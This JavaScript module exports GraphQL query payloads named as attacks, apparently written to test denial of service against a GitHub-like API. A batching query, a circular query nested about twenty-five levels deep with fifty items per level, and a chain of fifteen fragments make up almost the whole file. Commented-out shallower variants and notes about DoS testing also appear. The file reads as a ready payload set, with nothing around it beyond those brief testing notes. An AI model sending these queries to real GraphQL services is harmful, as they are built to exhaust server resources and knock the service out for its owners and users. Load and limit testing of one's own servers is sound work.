const { gql } = require('@apollo/client');

const queries = {
  batchingAttack: gql`
  query {
      users(first: 100) {
        edges {
          node {
            id
            login
            name
            repositories(first: 50) {
              nodes {
                id
                name
                description
                owner {
                  id
                  login
                  name
                  repositories(first: 50) {
                    nodes {
                      id
                      name
                      description
                      owner {
                        id
                        login
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
        pageInfo {
          endCursor
          hasNextPage
        }
      }
    }
  `,
// first used query for also testing dos with conditions
/*  circularQueryAttack: gql`
  query circularQuery {
    user(login: "someUser") {
      id
      login
      name
      repositories(first: 50) {
        nodes {
          id
          name
          description
          owner {
            id
            login
            name
            repositories(first: 50) {
              nodes {
                id
                name
                description
                owner {
                  id
                  login
                  name
                  repositories(first: 50) {
                    nodes {
                      id
                      name
                      description
                      owner {
                        id
                        login
                        name
                        repositories(first: 50) {
                          nodes {
                            id
                            name
                            description
                            owner {
                              id
                              login
                              name
                              repositories(first: 50) {
                                nodes {
                                  id
                                  name
                                  description
                                  owner {
                                    id
                                    login
                                    name
                                    repositories(first: 50) {
                                      nodes {
                                        id
                                        name
                                        description
                                        owner {
                                          id
                                          login
                                          name
                                          repositories(first: 50) {
                                            nodes {
                                              id
                                              name
                                              description
                                              owner {
                                                id
                                                login
                                                name
                                                repositories(first: 50) {
                                                  nodes {
                                                    id
                                                    name
                                                    description
                                                    owner {
                                                      id
                                                      login
                                                      name
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
`,
*/

circularQueryAttack: gql`
  query circularQuery {
    user(login: "someUser") {
      id
      login
      name
      repositories(first: 50) {
        nodes {
          id
          name
          description
          owner {
            id
            login
            name
            repositories(first: 50) {
              nodes {
                id
                name
                description
                owner {
                  id
                  login
                  name
                  repositories(first: 50) {
                    nodes {
                      id
                      name
                      description
                      owner {
                        id
                        login
                        name
                        repositories(first: 50) {
                          nodes {
                            id
                            name
                            description
                            owner {
                              id
                              login
                              name
                              repositories(first: 50) {
                                nodes {
                                  id
                                  name
                                  description
                                  owner {
                                    id
                                    login
                                    name
                                    repositories(first: 50) {
                                      nodes {
                                        id
                                        name
                                        description
                                        owner {
                                          id
                                          login
                                          name
                                          repositories(first: 50) {
                                            nodes {
                                              id
                                              name
                                              description
                                              owner {
                                                id
                                                login
                                                name
                                                repositories(first: 50) {
                                                  nodes {
                                                    id
                                                    name
                                                    description
                                                    owner {
                                                      id
                                                      login
                                                      name
                                                      repositories(first: 50) {
                                                        nodes {
                                                          id
                                                          name
                                                          description
                                                          owner {
                                                            id
                                                            login
                                                            name
                                                            repositories(first: 50) {
                                                              nodes {
                                                                id
                                                                name
                                                                description
                                                                owner {
                                                                  id
                                                                  login
                                                                  name
                                                                  repositories(first: 50) {
                                                                    nodes {
                                                                      id
                                                                      name
                                                                      description
                                                                      owner {
                                                                        id
                                                                        login
                                                                        name
                                                                        repositories(first: 50) {
                                                                          nodes {
                                                                            id
                                                                            name
                                                                            description
                                                                            owner {
                                                                              id
                                                                              login
                                                                              name
                                                                              repositories(first: 50) {
                                                                                nodes {
                                                                                  id
                                                                                  name
                                                                                  description
                                                                                  owner {
                                                                                    id
                                                                                    login
                                                                                    name
                                                                                    repositories(first: 50) {
                                                                                      nodes {
                                                                                        id
                                                                                        name
                                                                                        description
                                                                                        owner {
                                                                                          id
                                                                                          login
                                                                                          name
                                                                                          repositories(first: 50) {
                                                                                            nodes {
                                                                                              id
                                                                                              name
                                                                                              description
                                                                                              owner {
                                                                                                id
                                                                                                login
                                                                                                name
                                                                                                repositories(first: 50) {
                                                                                                  nodes {
                                                                                                    id
                                                                                                    name
                                                                                                    description
                                                                                                    owner {
                                                                                                      id
                                                                                                      login
                                                                                                      name
                                                                                                      repositories(first: 50) {
                                                                                                        nodes {
                                                                                                          id
                                                                                                          name
                                                                                                          description
                                                                                                          owner {
                                                                                                            id
                                                                                                            login
                                                                                                            name
                                                                                                            repositories(first: 50) {
                                                                                                              nodes {
                                                                                                                id
                                                                                                                name
                                                                                                                description
                                                                                                                owner {
                                                                                                                  id
                                                                                                                  login
                                                                                                                  name
                                                                                                                  repositories(first: 50) {
                                                                                                                    nodes {
                                                                                                                      id
                                                                                                                      name
                                                                                                                      description
                                                                                                                      owner {
                                                                                                                        id
                                                                                                                        login
                                                                                                                        name
                                                                                                                      }
                                                                                                                    }
                                                                                                                  }
                                                                                                                }
                                                                                                              }
                                                                                                            }
                                                                                                          }
                                                                                                        }
                                                                                                      }
                                                                                                    }
                                                                                                  }
                                                                                                }
                                                                                              }
                                                                                            }
                                                                                          }
                                                                                        }
                                                                                      }
                                                                                    }
                                                                                  }
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
`,

// first used query for also testing dos with conditions


/*circularFragments: gql`
query {
  user(login: "someUser") {
    ...UserFields
  }
}

fragment UserFields on User {
  id
  login
  name
  repositories(first: 50) {
    nodes {
      ...RepositoryFields
    }
  }
}

fragment RepositoryFields on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel2
      }
    }
  }
}

fragment RepositoryFieldsLevel2 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel3
      }
    }
  }
}

fragment RepositoryFieldsLevel3 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel4
      }
    }
  }
}

fragment RepositoryFieldsLevel4 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel5
      }
    }
  }
}

fragment RepositoryFieldsLevel5 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel6
      }
    }
  }
}

fragment RepositoryFieldsLevel6 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel7
      }
    }
  }
}

fragment RepositoryFieldsLevel7 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel8
      }
    }
  }
}

fragment RepositoryFieldsLevel8 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
  }
}
`*/

circularFragments: gql`
query {
  user(login: "someUser") {
    ...UserFields
  }
}

fragment UserFields on User {
  id
  login
  name
  repositories(first: 50) {
    nodes {
      ...RepositoryFields
    }
  }
}

fragment RepositoryFields on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel2
      }
    }
  }
}

fragment RepositoryFieldsLevel2 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel3
      }
    }
  }
}

fragment RepositoryFieldsLevel3 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel4
      }
    }
  }
}

fragment RepositoryFieldsLevel4 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel5
      }
    }
  }
}

fragment RepositoryFieldsLevel5 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel6
      }
    }
  }
}

fragment RepositoryFieldsLevel6 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel7
      }
    }
  }
}

fragment RepositoryFieldsLevel7 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel8
      }
    }
  }
}

fragment RepositoryFieldsLevel8 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel9
      }
    }
  }
}

fragment RepositoryFieldsLevel9 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel10
      }
    }
  }
}

fragment RepositoryFieldsLevel10 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel11
      }
    }
  }
}

fragment RepositoryFieldsLevel11 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel12
      }
    }
  }
}

fragment RepositoryFieldsLevel12 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel13
      }
    }
  }
}

fragment RepositoryFieldsLevel13 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel14
      }
    }
  }
}

fragment RepositoryFieldsLevel14 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
    repositories(first: 50) {
      nodes {
        ...RepositoryFieldsLevel15
      }
    }
  }
}

fragment RepositoryFieldsLevel15 on Repository {
  id
  name
  description
  owner {
    id
    login
    name
  }
}
`

};

module.exports = queries;
